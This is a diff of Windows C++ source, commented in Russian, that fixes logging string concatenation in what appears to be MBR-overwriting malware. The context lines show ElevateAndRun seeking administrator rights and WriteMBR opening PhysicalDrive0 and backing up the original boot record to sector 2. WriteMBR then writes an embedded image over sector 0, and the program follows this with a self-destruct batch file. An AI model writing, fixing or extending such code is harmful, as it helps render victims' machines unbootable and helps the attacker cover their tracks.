@@ -23,6 +23,11 @@ void Log(const char* msg) {
     }
 }
 
+// Перегрузка для std::string
+void Log(const std::string& msg) {
+    Log(msg.c_str());
+}
+
 // ============================================================
 // ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА
 // ============================================================
@@ -123,7 +128,7 @@ void ElevateAndRun() {
     Log("ElevateAndRun() called");
     char szPath[MAX_PATH];
     GetModuleFileNameA(NULL, szPath, MAX_PATH);
-    Log("Path: " + std::string(szPath));
+    Log(std::string("Path: ") + szPath);
     
     LPSTR lpCmdLine = GetCommandLineA();
     
@@ -165,7 +170,7 @@ void WriteMBR() {
     Log("Resource loaded");
     
     DWORD size = SizeofResource(NULL, hRes);
-    Log("Resource size: " + std::to_string(size));
+    Log(std::string("Resource size: ") + std::to_string(size));
     
     unsigned char* image = (unsigned char*)LockResource(hData);
     if (!image || size < 512) {
@@ -187,7 +192,7 @@ void WriteMBR() {
     );
     
     if (hDisk == INVALID_HANDLE_VALUE) {
-        Log("CreateFile failed, error: " + std::to_string(GetLastError()));
+        Log(std::string("CreateFile failed, error: ") + std::to_string(GetLastError()));
         hDisk = CreateFileA(
             "\\\\.\\PhysicalDrive0",
             GENERIC_READ | GENERIC_WRITE,
@@ -198,7 +203,7 @@ void WriteMBR() {
             NULL
         );
         if (hDisk == INVALID_HANDLE_VALUE) {
-            Log("Fallback failed, error: " + std::to_string(GetLastError()));
+            Log(std::string("Fallback failed, error: ") + std::to_string(GetLastError()));
             return;
         }
         Log("Disk opened via fallback");
@@ -230,10 +235,10 @@ void WriteMBR() {
     Log("Original MBR saved to sector 2");
     
     // --- ШАГ 3: ЗАПИСЫВАЕМ НАШ ОБРАЗ ---
-    Log("Writing our image, size: " + std::to_string(size));
+    Log(std::string("Writing our image, size: ") + std::to_string(size));
     SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
     WriteFile(hDisk, image, size, &bytesWritten, NULL);
-    Log("Image written, bytes: " + std::to_string(bytesWritten));
+    Log(std::string("Image written, bytes: ") + std::to_string(bytesWritten));
     
     CloseHandle(hDisk);
     Log("Disk closed");
@@ -242,7 +247,7 @@ void WriteMBR() {
     Log("Self-destruct...");
     char szPath[MAX_PATH] = {0};
     GetModuleFileNameA(NULL, szPath, MAX_PATH);
-    Log("Path: " + std::string(szPath));
+    Log(std::string("Path: ") + szPath);
     
     std::string batPath = std::string(szPath) + ".bat";
     std::ofstream bat(batPath.c_str());
